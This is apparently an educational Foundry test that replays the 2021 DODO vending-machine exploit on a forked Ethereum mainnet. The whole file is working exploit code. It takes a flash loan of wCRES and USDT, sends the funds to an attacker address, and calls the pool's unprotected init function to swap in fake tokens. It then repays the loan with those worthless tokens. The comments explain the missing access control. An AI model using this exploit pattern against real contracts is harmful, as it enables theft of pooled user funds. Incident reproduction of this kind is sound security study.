// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../utils/2021_Dodo_InitializableToken.sol";

interface IDVM {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function sync() external;

    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function getVaultReserve()
        external
        view
        returns (uint256 baseReserve, uint256 quoteReserve);
}

interface IERC20 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function withdraw(uint256 wad) external;

    function deposit(uint256 wad) external returns (bool);

    function owner() external view virtual returns (address);
}

interface IUSDT {
    function transfer(address to, uint256 value) external;

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 value) external;
}

contract Constants {
    IDVM dodoVendingMachineContract =
        IDVM(0x051EBD717311350f1684f89335bed4ABd083a2b6);

    IERC20 wCRES = IERC20(0xa0afAA285Ce85974c3C881256cB7F225e3A1178a);
    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    // hacker's fake tokens
    IERC20 fdo = IERC20(0x7f4E7fB900E0EC043718d05caEe549805CaB22C8);
    IUSDT fusdt = IUSDT(0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010);

    // i was unable to figure out how to fetch these public variables
    // from the deployed contracts
    // if you know how to do this, pls drop me a line
    address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
    address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
    uint256 lpFeeRate = 3000000000000000;
    uint256 i = 1;
    uint256 k = 1000000000000000000;
    bool isOpenTWAP = false;

    uint256 wCRES_amount = 130000000000000000000000;
    uint256 usdt_amount = 1100000000000;
    address attacker = 0x368A6558255bCCaC517da5106647d8182C571b23;
}

contract DodoAttack is Test, Constants {
    InitializableERC20 token1;
    InitializableERC20 token2;

    function setUp() public {
        vm.createSelectFork("mainnet", 12000160); //go back in time
        token1 = new InitializableERC20();
        emit log_named_address("fake token 1 address: ", address(token1));

        token2 = new InitializableERC20();
        emit log_named_address("fake token 2 address: ", address(token2));

        token1.init(
            address(this),
            144897917762348532103754,
            "fakeToken1",
            "FTO1",
            18
        );

        token2.init(address(this), 1250965863028, "fakeToken2", "FTO2", 6);
        emit log(" ");
    }

    function testInit() public {
        token1.transfer(address(this), 140000000000000000000000);
        emit log_named_uint(
            "fake token 1 balance in contract",
            token1.balanceOf(address(this))
        );

        token2.transfer(address(this), 1200000000000);
        emit log_named_uint(
            "fake token 2 balance in contract",
            token2.balanceOf(address(this))
        );

        emit log(" ");

        emit log("=== DVM initial state ===");
        (uint256 baseReserve, uint256 quoteReserve) = dodoVendingMachineContract
            .getVaultReserve();
        emit log_named_uint("Base token reserve (wCRES) in DVM", baseReserve);
        emit log_named_uint("Quote token reserve (USDT) in DVM", quoteReserve);

        emit log("");

        // 1. take a flashloan and transfer money to this contract
        dodoVendingMachineContract.flashLoan(
            wCRES_amount,
            usdt_amount,
            address(this),
            "0x13"
        );
    }

    function DVMFlashLoanCall(
        address a,
        uint256 b,
        uint256 c,
        bytes memory d
    ) public {
        // 2.  transfer wCRES and USDT to attacker wallet
        emit log(" =============== ");
        emit log("Transfering wCRES and USDT tokens to attacker wallet");
        emit log(" ");

        wCRES.transfer(attacker, wCRES.balanceOf(address(this)));

        emit log(" transfer success");

        emit log_named_uint(
            "wCRES Balance of the attacker",
            wCRES.balanceOf(attacker)
        );

        usdt.transfer(attacker, usdt.balanceOf(address(this)));

        emit log_named_uint(
            "usdt Balance of the attacker",
            usdt.balanceOf(attacker)
        );
        emit log(" =============== ");
        emit log("");

        // 3. initialize fake tokens as the DMV default tokens
        emit log(
            "changing default BASE_RESERVE token and QUOTE_TOKEN in the DVM contract"
        );

        // init has no access control so change the base tokens of the contract to fake tokens
        // init alows any attacker to change _BASE_TOKEN_ & _QUOTE_TOKEN_ variables
        dodoVendingMachineContract.init(
            maintainer,
            address(token1),
            address(token2),
            lpFeeRate,
            mtFeeRateModel,
            i,
            k,
            isOpenTWAP
        );

        emit log("init function success");
        emit log("");

        emit log(
            "transfering fake tokens into contract to make the flash loan function believe that the debt was paid in full"
        );
        emit log("");

        // 4. transfer tokens wanted by the flashloan back to the contract
        token1.approve(address(this), 140000000000000000000000);
        token1.transferFrom(
            address(this),
            0x051EBD717311350f1684f89335bed4ABd083a2b6,
            140000000000000000000000
        );
        emit log_named_uint(
            "fake token 1 in DVM contract",
            token1.balanceOf(0x051EBD717311350f1684f89335bed4ABd083a2b6)
        );

        token2.approve(address(this), 1200000000000);
        token2.transferFrom(
            address(this),
            0x051EBD717311350f1684f89335bed4ABd083a2b6,
            1200000000000
        );
        emit log_named_uint(
            "fake token 2 in DVM contract",
            token2.balanceOf(0x051EBD717311350f1684f89335bed4ABd083a2b6)
        );

        emit log("");

        emit log("lesson: neeeeever have init as an external function");

        emit log("=== exiting flashloan callback ===");
    }
}
